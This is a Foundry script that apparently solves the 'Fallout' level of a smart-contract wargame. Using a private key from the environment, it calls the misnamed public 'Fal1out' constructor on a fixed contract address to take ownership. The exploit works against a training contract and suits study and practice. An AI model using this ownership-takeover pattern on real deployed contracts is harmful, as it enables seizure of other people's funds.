// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Lev2Fallout.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// notes
// target 取得合約的所有權

contract Lev2Sol is Script {
    Lev2Fallout public lev2Instance = Lev2Fallout(payable(0x2F8493aD49485c713ADE3eD7CcDb0B3766195b84));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // write solution here
        // console.log("owner before:", lev2Instance.owner());
        lev2Instance.Fal1out();
        // console.log("owner after:", lev2Instance.owner());

        vm.stopBroadcast();
    }
}
